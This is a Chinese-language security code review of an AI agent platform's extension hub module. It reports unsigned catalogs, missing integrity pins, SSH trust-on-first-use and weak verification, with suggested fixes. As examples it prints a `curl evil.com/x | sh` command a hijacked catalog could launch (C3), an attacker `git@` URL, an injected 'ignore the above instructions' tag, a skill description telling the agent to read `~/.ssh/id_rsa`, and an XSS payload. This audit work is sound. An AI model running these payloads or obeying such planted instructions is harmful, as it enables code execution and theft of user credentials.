# 静态代码审查报告 — `hub` 模块

- **审查单元**: `src/hub/` — Extensions Hub（catalog/origin/trust/install/verify/reconcile + 官方源/冷启动）
- **审查日期**: 2026-08-20
- **基线**: `.worktrees/review-modules`（与 main 一致的 git worktree，`hub/` 14 文件 ~4500 行）
- **方法**: 全量人工静态阅读 + 跨模块核查（`security/ssrf`、`mcp/manager`、`extension/marketplace`、`bundled/extractor`、`gateway/handlers/extensions/*`）

## 统计

| 指标 | 值 |
|------|-----|
| 源文件数 | 14（含 `mod.rs`） |
| 总行数 | ~4500 |
| 最大文件 | `install.rs`（741 行） |
| 生产代码 `unwrap()`/`expect()` | 0 处（`origin.rs:170` 用 `unwrap_or_default()` 是 serde 失败的兜底，非 panic 面） |
| `unsafe` | 0 处 |
| `tokio::spawn`/后台任务 | 1 处（`start/mod.rs:1949` 6h 周期 `sync_into`） |
| 自动启动的 secret-bearing 进程 | 通过 `extensions.install` MCP stdio → `add_server` → MCP 自动 spawn（verify § verify.rs:90） |
| 网络出口（fetch） | 1 处：`catalog_client.rs::safe_fetch`（catalog.json）；其余均为本地 git/文件操作 |
| TLS 栈 | `reqwest 0.12 + native-tls`（`Cargo.toml:165`）— 走系统 OpenSSL/SChannel；证书校验由 reqwest 默认开启 |

文件清单：`mod.rs` (23)、`cache.rs` (403)、`catalog_client.rs` (479)、`hub_catalog.rs` (229)、`install.rs` (741)、`official_mcp.rs` (161)、`official_plugins.rs` (129)、`official_skills.rs` (323)、`origin.rs` (394)、`primer.rs` (114)、`reconcile.rs` (428)、`secrets.rs` (72)、`trust.rs` (321)、`types.rs` (336)、`verify.rs` (197)。

---

## 核心架构评估

`hub` 是 Aleph 的**供应链根**：catalog (Hub URL + 官方子仓库 + 本地冷启 prime) → wire 校验（schema、injection、trust ceiling）→ 缓存（SQLite）→ 对账（live backends × ledger）→ 安装（route by spec）→ 验证（verify）。整体设计在**默认 fail-closed**（缺失即拒绝/降级）方面非常一致：

- `TrustTier::clamped_to`（`types.rs:107-117`）让 wire 不能自举 trust；
- `verify_plugin_integrity`（`installer.rs:197-208`）要求 sha256 必须相等；
- `HubCatalogArtifact::validate`（`hub_catalog.rs:101-119`）拦截 truncated / duplicate / `local:` id 注入；
- `safe_fetch`（`catalog_client.rs:241-262` + `security/ssrf/fetch.rs`）做 URL 校验 + DNS pinning + 30s timeout + 32 MiB body cap；
- `acceptable_git_url`（`install.rs:155-167`）白名单 https / scp-ssh。

但以下问题跨越多个文件，**说明安全假设需要在 README / 架构文档中显式声明**（参见末尾"未做的事"）。

---

## 发现列表（按严重级排序）

### Critical

**C1. `install.rs:152-167` + `install.rs:118-225` — 官方 plugins/skills 在 install 路径上没有任何内容完整性校验，仅依赖「来源 URL 是 HTTPS」+「原仓库可信」**

`official_plugins.rs:38-41` 与 `official_skills.rs:30-33` 在 `project_plugin/project_skill` 中**硬编码 `sha256: None`**：

```rust
let spec = InstallSpec::GitDir {
    git_url: OFFICIAL_PLUGINS_REPO.to_string(),  // "https://github.com/rootazero/Aleph-plugins"
    subdir,
    git_ref: None,
    sha256: None,                                // ←—
};
```

随后在 `install.rs:178-181`（`install_git_skill`）调用：

```rust
verify_plugin_integrity(&src_leaf, sha256.as_deref())
```

而 `extension/marketplace/installer.rs:197-208` 的实现是：

```rust
pub fn verify_plugin_integrity(source_path: &Path, expected_hash: Option<&str>) -> Result<(), String> {
    let Some(expected) = expected_hash else {
        return Ok(()); // No hash to verify   ←—
    };
    ...
}
```

→ 当 sha256 为 `None` 时**直接返回 Ok(())，零校验**。`extension/marketplace/mod.rs:351-358` 的 plugin install 路径同样依赖此函数。

官方源的供应链：
1. `bundled/mod.rs:34-35` 把 `OFFICIAL_SKILLS_REPO = "https://github.com/rootazero/..."` 作为常量；
2. `bundled/sync.rs:11-104` 用 libgit2 `clone_or_update_at`，**无 detached commit/tag pin、无 known_hosts 严格模式、无 sha256**；
3. 启动时 `extract_bundled_content` + `sync_official_now`（`bin/aleph-server/commands/start/helpers.rs:355`）直接覆盖 `~/.aleph/skills/` 与 `~/.aleph/plugins/cache/aleph-official/`；
4. 用户从 Hub 安装 → 写入 `~/.aleph/skills/<name>` 或 `~/.aleph/plugins/<name>` —— 整条链路**没有任何端到端的内容指纹**。

`git_ref: None` + `update_existing_repo`（`bundled/sync.rs:73-84`）意味着每次启动都会 `fetch + reset --hard` 到 `origin/main`，无锁。

**风险**：原仓库（GitHub `rootazero/Aleph-skills` / `Aleph-plugins`）若被 takeover、或上游 TLS 中间人成功（libgit2 在 curl 模式下默认校验系统 CA；但 SSH 模式无校验，见 C2）、或镜像被污染，所有 Aleph 用户的 `~/.aleph/skills/*` 与 `~/.aleph/plugins/*` 在下次启动后**静默被替换为任意代码**。Plugin 通过 WASM runtime（`extension/runtime/wasm/`）执行，技能内容直接进入 prompt injection surface。

**建议**：
- 在 `bundled/mod.rs` 把 `OFFICIAL_SKILLS_REPO` / `OFFICIAL_PLUGINS_REPO` 升级到 **detached tag pin**（如 `v2026.08.20`）并写入 build-time hash：
  ```rust
  pub const OFFICIAL_SKILLS_REPO: &str = "https://github.com/rootazero/Aleph-skills";
  pub const OFFICIAL_SKILLS_REF: &str = "v2026.08.20";           // 新增
  pub const OFFICIAL_SKILLS_MANIFEST_SHA256: &str = "<computed>"; // 新增
  ```
- `official_skills.rs:30` / `official_plugins.rs:38` 把 `sha256: Some(<per-leaf pinned>)` 写入 `GitDir`；
- 启动 sync 时先 `verify_plugin_integrity(<checkout>, Some(MANIFEST_SHA256))` 再 `reset --hard`；
- 在 Hub 文档/AGENTS.md 里把这个 supply-chain 假设显式落字：现阶段「Hub 离线 prime + 启动 git pull」等价于「信任 Aleph-skills / Aleph-plugins GitHub 仓库的可控性 + GitHub TLS」。

---

**C2. `install.rs:155-167` (`acceptable_git_url`) — 接受 `git@host:path` 形式（SCP-style SSH），绕过了 HTTPS 的证书校验**

```rust
fn acceptable_git_url(url: &str) -> bool {
    let production_ok =
        url.starts_with("https://") || (url.starts_with("git@") && url.contains(':'));
    ...
}
```

git@ 形式在 libgit2 + 系统 SSH 栈下走 SSH 协议，**默认 trust-on-first-use（TOFU）**：第一次连接一个 host 会**自动接受 host key 并写入 `~/.ssh/known_hosts`**，没有交互确认。

`OFFICIAL_SKILLS_REPO` / `OFFICIAL_PLUGINS_REPO` 自身用的是 HTTPS，但：
- `official_plugins.rs:38` / `official_skills.rs:30` 直接构造 `GitDir` 用常量 URL；
- 然而 `project_plugin`/`project_skill` 接受任何 `InstallSpec::GitDir` —— catalog entry 可以声明 `git_url: "git@evil.example.com:foo/bar"`（只要冒号存在），用户从此路径安装的第三方插件/技能就会**通过 SSH-Trust-On-First-Use 连接到攻击者控制的主机**，拿到一个任意仓库的 `sha256: <evil>` pin 后又"通过"了 sha256 校验（如果 catalog 真的给了 pin）。

**风险**：与 C1 叠加后，任何 catalog entry（Hub 或第三方）只要声明 `git_url: "git@..."` + 可控的 `sha256`，就能让客户端 SSH 到任意主机并下载任意内容（受 sandbox 限制，但仍能在 skills/plugins 模型内执行恶意逻辑）。

**建议**：
- 把生产接受集收紧到 `https://` 单方案（删除 `git@` 分支）；
- 或者保留 git@ 但在 `clone_or_update_at` 之前**校验 known_hosts 中已存在该 host 的 entry**，拒绝 first-time host key；
- 对官方源则强制要求 HTTPS（如上 C1）。

---

**C3. `catalog_client.rs:118` + 整个模块 — Hub catalog 没有任何数字签名，TLS 是唯一信任根**

```rust
pub const ALEPH_HUB_URL: &str = "https://hub.heyaleph.com/catalog.json";
```

`safe_fetch`（`security/ssrf/fetch.rs:142-184`）做的是：
- URL scheme/host 校验 + DNS pinning；
- `reqwest::Client::builder()` 默认行为（CA 验证 + CN/SAN）；
- body cap、redirect 链 strip auth headers。

**没有任何 detached signature / minisign / cosign 校验**。

这意味着：
- `hub.heyaleph.com` TLS 私钥泄露 → 攻击者可以推送任意 catalog（任意 `trust_tier: "official"`，被 `clamped_to(Verified)` 拦成 Verified，但仍然能在 `aleph-hub` slot 上插入任意 MCP stdio command / env / URL —— 参考 `hub_catalog.rs:62-65` 与 `catalog_client.rs:188-216`，`requires_config` 是从 `install_spec` 重算的，但 `command` / `args` / `env[].default` / `headers[].secret=false` 的字段都直接来自 wire）；
- `rootazero` GitHub 账号被 takeover → 与 C1 叠加；
- 任何中间 CA 颁发的证书（取决于系统 trust store）能伪造 host。

**风险**：catalog 决定 install spec —— 一个被劫持的 catalog 可以让 Aleph 启动 `curl evil.com/x | sh` 之类的 stdio command（mcp stdio 没有进一步校验，直接 `add_server` 后 MCP spawn）。

**建议**：
- 短期（最小改动）：为 `catalog.json` 引入 **minisign detached signature**（`catalog.json.sig`），`fetch_ingested` 拿到 body 后用内嵌的 public key 校验签名；
- 中期：把签名 key fingerprint 移到 build-time constant + 提供 `AlephHubCatalog::with_signature_key(...)`；
- 在 hub docs 标注「this build trusts TLS to `hub.heyaleph.com` only」作为过渡声明。

---

### High

**H1. `verify.rs:139-142` + `verify.rs:148` — Plugin / Skill verify 仅 `Path::new(path).exists()`，对 symlink / 空文件 / TOCTOU 零防御**

```rust
InstallOutcome::Plugin { path } => {
    if std::path::Path::new(path).exists() {
        VerifyReport { ok: true, detail: format!("plugin present at {path}") }
    } ...
}
```

`Path::exists()` 对 symlink、empty file、mount-bind 都返回 true。攻击/失败面：
1. **Symlink 替换**：若用户在 install 后把 `~/.aleph/plugins/foo` 替换为指向 `/tmp/whatever` 的 symlink，verify 仍报 ok；
2. **空目录/空文件**：若 install 失败但目标路径因 rename 残留 `.bak-foo` 之类，verify 也会报 ok（因为路径存在）；
3. **TOCTOU**：verify 是在 `extensions.install` 完成后立刻跑（`gateway/handlers/extensions/install.rs:280-291`），中间窗口很短但 `verify_after_install` 走 `reload().await`，期间可能用户/其他进程修改；
4. **路径语义丢失**：plugin 真正能 load 是依赖 `validate_plugin` + manifest parse + 工具名去重（`extension/validation.rs`），verify 不做这些，等于「verify_ok ⇒ runtime_ok」是 false。

对比 `extension/marketplace/installer.rs:285-291`（`stage_plugin_copy` 用 `symlink_metadata` 拒绝 symlink 形式的 staging）—— 安装路径严格但 verify 路径宽松。

**风险**：调用方（Panel `extensions.install` 响应 + `hub_install_verify` tool）把 `verify.ok=true` 当作「可用」信号，对外契约不成立。

**建议**：
```rust
InstallOutcome::Plugin { path } => {
    let p = std::path::Path::new(path);
    if !p.exists() {
        return VerifyReport { ok: false, ... };
    }
    let meta = std::fs::symlink_metadata(p).map_err(...)?;
    if meta.file_type().is_symlink() {
        return VerifyReport { ok: false, detail: "plugin path is a symlink".into() };
    }
    if !meta.is_dir() {
        return VerifyReport { ok: false, detail: "plugin path is not a directory".into() };
    }
    // optional: re-run validate_plugin() to gate on manifest + tools, like install path
    VerifyReport { ok: true, ... }
}
```
Skill 同理（`verify.rs:148`）。

---

**H2. `secrets.rs:17-30` (`sanitize`) — 名字空间 `ext.{kind}.{sanitized_id}.{field}` 不可保证唯一性，两个不同 id 可产生相同 vault key**

```rust
fn sanitize(part: &str) -> String {
    part.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.') {
                c
            } else {
                '_'
            }
        })
        .collect()
}
```

`field_key` = `ext.{kind}.{sanitize(id)}.{sanitize(field)}`。

`sanitize` 把所有非 `[A-Za-z0-9_.-]` 替换为 `_`，但**保留**了 `.`。两个不同的 id：
- `"foo bar"` → sanitize → `"foo_bar"`
- `"foo+bar"` → sanitize → `"foo_bar"`
- `"foo_bar"` → `"foo_bar"`

→ 同名 vault key。`vault.store_secret(&key, val)`（`gateway/handlers/extensions/install.rs:178`）会**直接覆盖前者的 secret**。

`extract_secret_refs`（`crates/secrets`，`install.rs:18` 注释引用）能 parse 这个 key（注释说"guaranteed valid as a `{{secret:NAME}}` placeholder name"），但**不保证 vault 命名空间的全局唯一性**。

**风险**：
  1. 攻击者：拿到 catalog 后挑选 id 撞已有 secret 的 key，然后通过 `extensions.install` 用自己的值覆盖 vault，导致**已安装扩展指向错误的 secret**（例如把 `GITHUB_TOKEN` 替换为攻击者控制的 token）；
  2. 自损：用户先后安装两个名字相近的扩展，第二个静默覆盖第一个的 secret。

**建议**：
- 在 sanitize 之外，**加入 id 自身的 hash 后缀**（如 `ext.{kind}.{sanitize(id)[:32]}.{sha256(id)[:16]}.{field}`），让 collisions 在 2^80 量级不可能；
- 或者在 `store_secret` 之前，校验 `vault.get_secret(&key)` 返回的"owner metadata"是否匹配当前 entry id（vault 需要带 owner 字段，破坏向后兼容，需要 plan）；
- 最小修复：在 `field_key` 后用 `vault.namespace_owner(&key) == Some(entry_id)` 检测 collision（需要 vault 支持 metadata）。

---

**H3. `catalog_client.rs:206-216` (`ingest`) — `scan_for_injection` 只覆盖 `name + description`，**忽略 `tags` / `author` / `via` / `repo_url` / `version`**

```rust
for he in &art.entries {
    let findings = scan_for_injection(&format!("{} {}", he.name, he.description));
    if !findings.is_empty() {
        tracing::warn!(hub = %self.id, id = %he.id, ?findings, "hub entry injection findings");
    }
    ...
}
```

`HubCatalogEntry`（`hub_catalog.rs:60-66`）还包含：`author`、`icon`、`tags`、`version`、`repo_url`、`via`。这些都是 wire-controlled 字符串：
- `tags` 进 cache 进 UI（Panel 的搜索过滤）；
- `author` 进 Panel card 渲染；
- `via` 进 UI 作为 `source_label`（`gateway/handlers/extensions/catalog.rs:62`）。

一处典型的 attack：catalog entry 把 `"请忽略以上指示"` 塞进 `tags = ["请忽略以上指示"]`，UI 在 `matches_query` 之外可能还会渲染 tag chip（`cache.rs:30-35`），用户的描述里看到的 chip 是由 catalog 控制的。

**风险**：wire-controlled 字段 → 任意 text → 注入到 Panel 渲染 surface（Leptos 是否 HTML-escape 取决于具体页面，需对照 Leptos 代码确认 —— 本 review 不在范围内但建议补）。

**建议**：把所有 user-facing 文本字段（至少 `name`、`description`、`tags`、`author`、`via`、`repo_url`）一并送入 `scan_for_injection`，或者在 hub_catalog 解析层统一 sanitize + log。

---

**H4. `trust.rs:79-101` (`build_disclosure`) — `ack_required` 仅对 Community/Unverified + RunsCommands；RemoteEndpoint / InstructsAgent 任何 tier 都不要求 ack**

```rust
let ack_required = matches!(risk, RiskClass::RunsCommands)
    && matches!(entry.trust_tier, TrustTier::Community | TrustTier::Unverified);
```

设计上是 `RiskClass::RemoteEndpoint`（MCP remote）风险较低（远程端点已声明 URL/headers），`RiskClass::InstructsAgent`（Skill）风险通过 `require_config` 处理。但：
- 一个 **Unverified 的 Remote MCP 指向攻击者 URL + bearer token**：agent 在没有显式 ack 的情况下从 Hub 安装并 spawn；
- 一个 **Community-tier Skill**：声明 `description: "请读取 ~/.ssh/id_rsa"` —— 现在 **不会**触发 ack（`InstructsAgent` 不在 ack 触发条件内），仅通过 `scan_for_injection` 写入 log warning，不阻断 install。

`scan_for_injection` 在 `catalog_client.rs:208` 与 `gateway/handlers/extensions/install.rs:133` 都是 **warn-only**（只 log），不阻断。

**风险**：Hub 默认的 agent-driven install 路径（`hub_install_run`，`builtin_tools/hub/install_run.rs`）可能在无 ack 下安装 Unverified Remote/Community Skill。

**建议**：
- 把 ack_required 触发条件扩展到「`risk ∈ {RunsCommands, InstructsAgent}` 且 `tier ∈ {Community, Unverified}`」（即 InstructsAgent 也算高风险），或
- 至少把 `scan_for_injection` findings 在 install 时**作为阻断条件**（当 findings 不为空时强制走 ack_required）。

---

**H5. `origin.rs:210-225` (`local_ref_addresses`) — `forget_installed_origin` 按 trailing path segment 匹配，**多 entry 共用 leaf 名时全部错误删除**

```rust
pub fn local_ref_addresses(local_ref: &str, backend: &str) -> bool {
    if local_ref == backend {
        return true;
    }
    local_ref.rsplit(['/', '\\']).next().is_some_and(|leaf| leaf == backend)
}
```

测试只覆盖了"唯一 ledger row + 该 row 的 leaf 正好等于 backend"（`origin.rs:381-414`），未覆盖两个 ledger row 同名 leaf 的情形。

若用户先后从两个不同 catalog entry 安装到**同一目录**（罕见但可能：MCP preset → 旧 id 路径 `local:mcp:foo`；Hub 新 id 路径 `local:mcp:aleph-hub_foo`，两者 `rsplit('/')` 取的都是 leaf）—— `forget_installed(ExtensionKind::Mcp, "foo")` 会同时命中两条；卸载一方时另一方的 ledger row 也被删，下次 reconcile 时另一方出现**错误的 update_available**。

**风险**：uninstall 后无辜的"还在"的扩展显示「待更新」badge（`update_available` 来自 ledger 缺失 + spec digest 不匹配）。

**建议**：plugin/skill 路径用**绝对路径等值**而非 leaf 匹配，或者在 row 里额外存 `parent_dir` + 严格 `(kind, source_path, name)` 三元匹配。`Mcp` 路径的 verbatim 比较已经正确（`origin.rs:212`）。

---

**H6. `reconcile.rs:107-149` (`mark_installed_state`) — Plugin / Skill 安装态按 `kind × lowercase(name)` 索引，**同名 catalog 多个 entry 共用同一 installed 状态**

```rust
let by_name: HashMap<(String, String), bool> = installed.iter().map(|e| {
    ((e.kind.as_str().to_string(), e.name.trim().to_lowercase()), e.enabled)
}).collect();
```

两个 catalog entry：
- `aleph-hub:foo-tools` (name = "Foo Tools")
- `clawhub:foo-tools` (name = "Foo Tools")

两者会被标成相同的 installed/enabled 状态。`extension/discovery/install-installed via local:plugin:foo-tools` 只代表一个 installed 路径，但 reconcile 让两个 catalog entry **都**显示已安装。

**风险**：UI 上让用户以为装了两个其实只装了一个；卸载时只卸掉一个，UI 仍显示两者 installed。

**建议**：name 匹配 + 一个**次级 key**（比如 `(kind, source_id, name)` 或 `(kind, name, sha256)`），让 `local:plugin:foo-tools` 区分来源；至少在 source_id 不同时保留独立状态。

---

### Medium

**M1. `hub_catalog.rs:62-65` (`HubCatalogEntry.config_schema: Option<serde_json::Value>`) — Wire-declared JSON Schema 不校验直接入库**

`into_entry`（`hub_catalog.rs:126-138`）把 `config_schema` 原样塞进 `ExtensionEntry.config_schema`。下游消费者（`gateway/handlers/extensions/catalog.rs`）直接 `serde_json::to_value(e)` 暴露给 Panel。

`requires_config` 是从 `install_spec` 重算的（`hub_catalog.rs:131`），避免了一个攻击面，但 `config_schema` 自身仍然 wire-controlled：
- 一份恶意 JSON Schema（递归结构、巨大尺寸、未知字段）会让 Panel 在 render 时 OOM / 卡死；
- JSON Schema 引用 `$ref: "file:///etc/passwd"`（虽然大多数 schema validator 拒绝，但不在校验路径里）。

**建议**：在 `hub_catalog.rs::HubCatalogArtifact::validate` 里加 `config_schema` 的 sanity 校验（schema 是 object、嵌套深度 ≤ N、size ≤ KiB）。或至少在 `into_entry` 时 `serde_json::from_value::<schemars::schema::Schema>` 验证是合法 Schema（`ExtensionKind`/`ExtensionCategory`/`TrustTier`/`McpTransport` 已经用 `schemars::JsonSchema` derive 了，`types.rs:3-46`，可以复用风格）。

---

**M2. `catalog_client.rs:166-178` (`AlephHubCatalog::new`) — 无 URL scheme / 无 source allowlist**

```rust
pub fn new(id: impl Into<String>, name: impl Into<String>,
           artifact_url: impl Into<String>, trust_tier: TrustTier) -> Self
```

任何调用者都能造一个 `AlephHubCatalog::new("aleph-hub", "Aleph Hub", "http://internal:8080/catalog.json", TrustTier::Official)`。`safe_fetch` 在 fetch 时做 scheme 校验（拒绝 `file://`/`gopher://`），但：
- `trust_tier: Official` 的来源没有任何签名/出处证明；
- `artifact_url` 在构造时不校验（运行时校验），意味着一个 daemon 启动期间**第一个 catalog_sync 调用决定 trust**——若调用者错配（如把内部 HTTP 服务误填为 Hub URL），后续所有 sync 都走那条路。

**建议**：构造时校验 `artifact_url.starts_with("https://")`；或要求传入一个 `&'static str` + 实现 `TryFrom` 限定来源（如 `HubUrl::Aleph` / `HubUrl::OperatorOverride`）。

---

**M3. `install.rs:343-353` (`install_git_skill`) — `.git-cache/<id>` 在 sha256 不匹配 / copy 失败后**未被删除**，disk leak 由"separate GC"承诺，但 `gc_git_checkouts` 在本仓库 grep 不存在**

`install.rs:217-222` 注释：

```rust
// Note: the per-entry `.git-cache/<id>` clone is intentionally left on
// disk so a follow-up install with a stronger pin (sha256) can re-clone
// cheaply without a network round-trip. The disk leak that this creates
// is bounded by a periodic GC sweep in `hub::cache::gc_git_checkouts`
// (added separately, not by this fix).
```

但是：

```
$ grep -n "gc_git_checkouts" src/hub/cache.rs src/hub/install.rs
(nothing)
```

`hub::cache::gc_git_checkouts` **不在本模块**。其它位置（`bundled/sync.rs`、`bundled/extractor.rs`）也没有这个函数。

→ 每个失败 install 留一个 ~MB 级 clone 在 `~/.aleph/skills/.git-cache/<entry_id>/`，无限累积。

**建议**：
- 把 GC 函数实际写出来并接入 6h 周期 sync（`start/mod.rs:1949` 已有周期 task，追加一个 task 即可）；
- 或者更简单：在 `install.rs:178-181` 的 sha256 mismatch 后**直接 `remove_dir_all(&checkout)`**，删除注释里的"留作后续 cheaper clone"逻辑（trade-off：下次强 pin 安装会重 clone，但磁盘不再泄漏）。

---

**M4. `cache.rs:107-117` (`replace_source`) — Slot-level replace 是事务的，但调用方（`catalog_client.rs:274-287`）在**空 entries 时 short-circuit 到"保留 last-good"**，导致 partial-trust 攻击面**

`AlephHubCatalog::sync_into`（`catalog_client.rs:270-292`）：

```rust
Ok(ing) if !ing.entries.is_empty() => {
    cache.replace_source(&self.id, &ing.entries).await ...
}
Ok(ing) => SyncReport {
    synced: 0,
    failed: vec!["empty catalog; kept last-good cache".into()],
    generated_at: ing.generated_at,
},
```

`HubCatalogArtifact::validate` 已经做了 `entry_count` 校验（`hub_catalog.rs:101-119`），但**`Ok(vec![])` 是合法的**（合法的 `manifest.entry_count = 0` + `entries: []`）。

如果 publisher 临时推送一个空 catalog：
1. `validate()` 通过（结构正确）；
2. `ingest()` 返回 `Ok(Ingested { entries: vec![], ... })`；
3. `sync_into` 不调用 `replace_source` —— **last-good 保留** ✓（这是设计意图）。

但是：如果一个**只装了一个 entry**的 catalog 客户端遇到这种情况：
- `sync_into` 报 `synced: 0`、`failed: ["empty catalog; kept last-good cache"]`；
- 用户看到错误 log，可能误以为 cache 已被清空，**实际仍可用**。
- 没有 `synced != entries.len()` 的检测或 stash。

行为合理，但 logging 上有歧义。

**建议**：把"empty"作为 info-level 而不是 warn-level，并把 `synced: 0` 改为 `kept_last_good: true` 字段，让调用方能区分"sync 失败"和"故意 short-circuit"。

---

**M5. `install.rs:341` (`mcp_server_id`) — `entry_id.replace([':', '/'], "_")` 不去重其它字符**

```rust
pub(crate) fn mcp_server_id(entry_id: &str) -> String {
    entry_id.replace([':', '/'], "_")
}
```

`aleph-hub:foo+bar` 与 `aleph-hub:foo/bar` 都被映射到 `aleph-hub_foo_bar`，但前者保留 `+`。**两个不同 id 撞同一个 server id** → `add_server` 第二次调用覆盖第一次（取决于 MCP actor 行为）。

测试 `install.rs:716-728` 只验证了 `aleph-hub_github == mcp_server_id("aleph-hub:github")`。

**建议**：在 sanitize 之后**追加 sha256(id) 短前缀**或类似去重机制；或者在构造时禁止 id 含有除 `:` `/` 之外的特殊字符。

---

**M6. `reconcile.rs:118-126` — 缺失 `installed` entry 的 update_available 计算在 `mark_installed_state` 内短路，但 `extension/handlers/catalog.rs::stamp_updates_from_ledger` 有独立路径；两条路径 update_available 的算法可能不一致**

`mark_installed_state`（`reconcile.rs:107-149`）的 update 判定：

```rust
if let Some(origin) = origins.iter().find(|o| o.entry_id == e.id) {
    e.update_available = crate::hub::origin::update_available(origin, e);
}
```

只对 `installed=true` 的 entry 计算。

`stamp_updates_from_ledger`（`gateway/handlers/extensions/catalog.rs:97-`）独立从 ledger 走 façade id → ledger row → catalog entry。

如果某 catalog entry 在两条 reconcile 路径中**状态不一致**（例如 installed 列表认为已安装但 mark_installed_state 漏掉匹配 —— 因为 `kind == Mcp` 用 id 比对而 `kind != Mcp` 用 name 比对，H6 的 collision 案例会让两条路径给出不同答案），UI 上的 update_available 不稳定。

**建议**：把 update_available 计算下沉到单一函数（接受 `(catalog_entry, maybe_origin, installed)` 三元组），两条路径都调它，避免逻辑发散。

---

**M7. `hub_catalog.rs:43` (`RESERVED_LOCAL_ID_PREFIX = "local:"`) — `via` 字段是 freeform，无 sanitize 即进 UI (`source_label`)**

```rust
via: self.via.clone().or_else(|| Some(hub_id.to_string())),
```

一个 catalog entry 声明 `"via": "<script>alert(1)</script>"`，Panel 在 `gateway/handlers/extensions/catalog.rs:62`：

```rust
obj.insert("source_label".into(), json!(e.via.clone().unwrap_or_default()));
```

直接 JSON encode 后由 Panel Leptos 消费。Leptos 多数组件会 HTML-escape string，但若 Panel 任何组件使用 `inner_html` / `@html` 绑定 source_label，会执行注入。

**风险**：取决于 Leptos 渲染侧的 binding。本 review 不在范围内，但应作为下游面板代码 review 的优先项。

**建议**：在 `hub_catalog.rs::validate` 加 `via` 字段 sanity check（长度 ≤ 64、不含 `<`/`>` 控制字符），或至少 sanitize 到 plain text 字符集。

---

**M8. `verify.rs:97-102` (`verify_install`) — `_ => (false, HealthObservation::Unknown)` catch-all 把任意**新增**的 `HealthStatus` 视为 "not running"**

```rust
let (running, observation) = match info.health {
    crate::mcp::manager::HealthStatus::Healthy => (true, HealthObservation::Healthy),
    crate::mcp::manager::HealthStatus::Degraded { .. } => (true, HealthObservation::Degraded),
    _ => (false, HealthObservation::Unknown),
};
```

若 MCP manager 加新状态（如 `Initializing`、`Paused`），verify 自动返回 `not running`，导致**合法 install 在 verify 阶段失败**。当前 `HealthStatus` 枚举（`mcp/manager/types.rs:288`）有 `Healthy` / `Degraded` / `Unhealthy` / `Restarting` / `Dead` / `Stopped`，未来扩展风险。

**建议**：在 catch-all 加 `tracing::warn!` 报告 unhandled variant，让新状态被记录；或改用 `matches!` 白名单显式枚举"running" 状态。

---

**M9. `official_mcp.rs:108-114` (`is_legacy_preset_server`) — 旧 preset 退役迁移 (`migrate_legacy_preset_servers`) 在启动时**静默删除**已配置好的 MCP 服务器**

`official_mcp.rs:117-131`：

```rust
pub async fn migrate_legacy_preset_servers(mcp: &McpManagerHandle) {
    ...
    for cfg in configs {
        if is_legacy_preset_server(&cfg) {
            let id = cfg.id.clone();
            match mcp.remove_server(id.clone()).await {
                Ok(()) => tracing::info!(...),
                Err(e) => tracing::warn!(...),
            }
        }
    }
}
```

判定逻辑（`official_mcp.rs:108-114`）：

```rust
pub fn is_legacy_preset_server(cfg: &McpManagerConfig) -> bool {
    let Some(preset) = presets::find(&cfg.id) else { return false; };
    preset.transports.iter().any(|t| match t.kind {
        McpTransportType::Stdio => t.command == cfg.command,
        McpTransportType::Http | McpTransportType::Sse => cfg.command.is_none(),
    })
}
```

误杀面：
- 用户**自定义** MCP server id 与某个 preset slug 重名（如用户 `mcp.add_server("github", ...)`，碰巧 preset 也叫 "github"），命令形态又匹配 → **用户配置被静默删除**；
- preset 列表新增一项 "github" 后，所有历史的同名自定义 server 都会被下一启动杀掉。

**建议**：把 `is_legacy_preset_server` 的命令匹配改成**与新 ID 命名空间不冲突**的检测（如要求 id **不含** `aleph-hub_` 前缀，匹配 `mcp_server_id` 的命名约定 —— 但反过来也可能漏杀；最佳是用 cfg 上的 `source` 字段标记 `Preset`）。

---

**M10. `install.rs:179` + `installer.rs:197-208` — `verify_plugin_integrity` 在 sha256 为 None 时早返回 Ok(())，但**调用方没有任何日志**说明 "未执行完整性校验"**

```rust
pub fn verify_plugin_integrity(source_path: &Path, expected_hash: Option<&str>) -> Result<(), String> {
    let Some(expected) = expected_hash else {
        return Ok(()); // No hash to verify
    };
    ...
}
```

配合 C1（官方插件/skill 全为 `sha256: None`），用户从 Hub 安装任何官方插件/技能**没有任何信号**表明未做完整性校验。

**建议**：函数签名加 `pub fn verify_plugin_integrity(source_path, expected_hash, kind: &str, id: &str)`，None 分支 emit `tracing::warn!(kind, id, "no integrity pin — install proceeding without content verification")`，让日志明确反映「未校验」状态。

---

**M11. `hub_catalog.rs:99` (`e.id.trim().is_empty()`) — whitespace-only id 检测**正确**，但 `e.name.trim().is_empty()` 之后**未验证** `e.description` / `tags` 不为空 / 不为 whitespace**

仅 id 与 name 的空校验（`hub_catalog.rs:101-112`）。Wire-controlled `description`、`tags`、`author`、`via` 都允许任意长度/任意字符（除了 H3 的 injection scan 是 warn-only）。

**建议**：在 `validate` 末尾加 `description` 长度上限（如 ≤ 4096）、`tags` 总数上限（如 ≤ 32）、每 tag 长度上限。

---

**M12. `cache.rs:30-43` (`matches_query`) — 搜索 hit 后再做 Rust 端过滤；SQL 阶段已经返回了 name_lc 索引行的全集，description/tags/author 命中需要 Rust 端扫所有 row**

```rust
let mut out: Vec<ExtensionEntry> = rows.collect::<rusqlite::Result<_>>()?;
if let Some(q) = &f.query {
    out.retain(|e| matches_query(e, q));
}
```

catalog 装满 1000+ entries 时，单次 `extensions.catalog query=foo` 把所有 row 反序列化（`from_str`）后再过滤。`data` 列是 JSON blob，无法走 SQLite `LIKE`（注释解释了原因：`"kind":"mcp"` 会误命中搜索 `mcp`，`cache.rs:14-16`）。

**风险**：性能而非安全。1000 entries × 5 KB JSON ≈ 5 MB 反序列化 / 每次搜索。

**建议**：把 description / tags / author 拆出来作为独立列（`description_lc TEXT`、`tags_csv TEXT`、`author_lc TEXT`），用 SQL `LIKE 'foo'` 过滤，Rust 端只做最终 trim。

---

**M13. `verify.rs:46-85` (`verdict_with_health`) — Healthy 与 Unknown 在 detail 字段上是相同输出字符串**

```rust
let health_note = match health {
    HealthObservation::Degraded => " (degraded)",
    HealthObservation::Healthy | HealthObservation::Unknown => "",
};
```

调用方若仅看 `detail` 字符串会**无法区分 Healthy 与 Unknown**（即"已分类为正常"和"无法分类"）。`HealthObservation` enum 的语义区分被 detail 字段吞掉。

**建议**：在 `VerifyReport` 加 `health: HealthObservation` 字段（或并入现有结构），让下游 render 能区分 Unknown（=未分类，不应声称"running fine"）。

---

**M14. `install.rs:144-149` (subdir guard) — 拒绝 `..` / 空 segment，但不拒绝**绝对路径**段**

```rust
